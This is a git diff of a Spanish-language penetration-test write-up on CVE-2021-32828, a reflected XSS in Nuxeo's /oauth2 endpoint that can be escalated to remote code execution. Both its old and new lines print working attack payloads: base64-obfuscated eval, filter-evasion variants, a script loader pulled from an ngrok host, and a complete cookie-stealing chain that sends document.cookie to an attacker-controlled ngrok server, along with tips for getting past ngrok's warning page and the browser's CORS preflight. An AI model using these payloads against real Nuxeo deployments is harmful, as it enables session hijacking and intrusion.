@@ -50,9 +50,6 @@ Con base en los resultados anteriores, se investigaron vulnerabilidades conocida
 
 - **CVE-2021-32828**: En versiones anteriores a la 11.5.109, la API REST `/oauth2` de Nuxeo es vulnerable a ataques de **Cross-Site Scripting (XSS)**. Este ataque puede ser escalado a **Remote Code Execution (RCE)** mediante el uso de la API de automatización.
 
-**Referencia oficial:**
-**https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo**
-
 ![Referencia CVE]
 <img width="1282" height="772" alt="image" src="https://github.com/user-attachments/assets/f50e3af5-ca7f-4186-9b2c-9118fa46730e" />
 
@@ -80,7 +77,10 @@ El resultado fue exitoso, mostrando una alerta con el dominio del sitio.
 
 ### 5. Análisis de RCE potencial
 
-El blog de Álvaro Muñoz describe una posible explotación para escalar el XSS a RCE usando carga de scripts externos:
+**Referencia Blog:**
+**https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo**
+
+El blog de [Álvaro Muñoz](https://github.com/pwntester) describe una posible explotación para escalar el XSS a RCE usando carga de scripts externos:
 ```
 http://localhost:8080/nuxeo/site/oauth2/%3Cimg%20src%20onerror%3Da%3Ddocument.createElement('script')%3ba.setAttribute('src',document.location.hash.substr(1))%3bdocument.head.appendChild(a)%3E/callback#//attacker.ngrok.io/exploit.js
 ```
@@ -93,45 +93,45 @@ Sin embargo, este método no funcionó en el entorno evaluado. Se intentaron var
 
 Se exploraron varias técnicas para evadir filtros o mejorar la ejecución del código inyectado:
 
-- **Payload 1: onerror + eval con Base64**
+**- Payload 1: onerror + eval con Base64**
 ```
 <img src=x onerror=eval(atob("YWxlcnQoJ1hTUycp"))>
 ```
 > Decodificado: `alert('XSS')`
 
-- **Payload 2: SVG con evento onload**
+- **- Payload 2: SVG con evento onload**
 ```
 <svg onload=eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))>
 ```
 > Decodificado: `alert(document.cookie)`
 
-- **Payload 3: iframe con srcdoc**
+- **- Payload 3: iframe con srcdoc**
 ```
 <iframe srcdoc="<script>alert(1)</script>"> ```
 ```
 
-**Payload 4: script tag directo**
+**- Payload 4: script tag directo**
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/<script>alert(1)</script>/callback
 ```
 
-**Payload 5: Codificación hexadecimal en el evento**
+**- Payload 5: Codificación hexadecimal en el evento**
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x o%6Eerror=alert(1)>/callback
 ```
 
-**Payload 6: Comentario HTML para evadir detección**
+**- Payload 6: Comentario HTML para evadir detección**
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=eval/--/(atob("YWxlcnQoMSk="))>/callback
 ```
 > alert(1)
 
-**Payload 7: Exfiltración con location.href**
+**- Payload 7: Exfiltración con location.href**
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=location.href='https://attacker.com?c='+document.cookie>/callback
 ```
 
-**Payload 8: Interacción con DOM**
+**- Payload 8: Interacción con DOM**
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=alert(document.body.innerHTML)>/callback
 ```
@@ -182,17 +182,22 @@ https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT
 ```
 _________________________________________________
 
-Hubo una situacion particular a la hora de hacer que funcionara el script codificado, debido a un problema al hacer **fetch** al servidor Ngrok
+### A tener en cuenta
 
-Ya que cuando visito manualmente https://xxxxx.ngrok-free.app, aparece un _browser warning_ de ngrok que bloquea el acceso automático.
-Esto es lo que está bloqueando tu petición con fetch. Ngrok ahora intercepta tráfico HTTP(S) sospechoso y requiere cabeceras especiales.
+Hubo una situación particular al hacer que funcionara el script codificado, debido a un problema al hacer **fetch** al servidor Ngrok.
 
-Como Ngrok lo documenta claramente. Se debe agregar esta cabecera:
+Cuando se visita manualmente `https://xxxxx.ngrok-free.app`, aparece un _browser warning_ de Ngrok que bloquea el acceso automático.  
+Esto es lo que está bloqueando tu petición con `fetch`. Ngrok ahora intercepta tráfico HTTP(S) sospechoso y requiere cabeceras especiales.
+
+<img width="1593" height="891" alt="image" src="https://github.com/user-attachments/assets/10555ab4-b275-4950-8bee-c858d61494b6" />
+
+Como Ngrok lo documenta claramente, se debe agregar esta cabecera especial:
 ```
 ngrok-skip-browser-warning: true
 ```
-Asi que el codigo funcional que se debe enviar seria:
-```
+Por lo tanto, el código funcional que se debe enviar sería:
+
+```javascript
 fetch("https://xxxxx.ngrok-free.app/log", {
   headers: {
     "ngrok-skip-browser-warning": "true"
@@ -204,11 +209,13 @@ Quedando finalmente y antes de codificar asi:
 btoa(`fetch("https://xxxxx.ngrok-free.app/log", {headers: {"ngrok-skip-browser-warning": "true"}})`)
 ```
 
-Aunque nuevamente generaba otro error, especificamente un error 505, ya que el navegador intenta hacer una preflight request CORS (método OPTIONS) antes de enviar el fetch.:
+Sin embargo, esto generaba otro error, específicamente un error 505, ya que el navegador intenta hacer una preflight request CORS (método OPTIONS) antes de enviar el fetch.
 
 <img width="1652" height="307" alt="image" src="https://github.com/user-attachments/assets/611eaf6c-1a96-4e3b-9690-cbcce3708048" />
 
-Usar una imagen, no fetch (más difícil de bloquear por CORS), asi que como alternativa se usa una imagen invisible (sin OPTIONS ni CORS):
+**Alternativa sin CORS**
+
+Lo ideal en este caso es evitar el uso de fetch y utilizar una imagen invisible, que no genera preflight ni está sujeta a CORS, de la siguiente manera:
 ```
 i = new Image();
 i.src = "https://xxxxx.ngrok-free.app/log?c=" + document.cookie;
@@ -216,12 +223,7 @@ i.src = "https://xxxxx.ngrok-free.app/log?c=" + document.cookie;
 Codificado en base 64:
 ```
 https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly94eHh4eC5uZ3Jvay1mcmVlLmFwcC9sb2c/Yz0iK2RvY3VtZW50LmNvb2tpZTs=%22))%3E/callback
-
 ```
-
-<img width="1593" height="891" alt="image" src="https://github.com/user-attachments/assets/10555ab4-b275-4950-8bee-c858d61494b6" />
-
-
 
 _________________________________________________
 
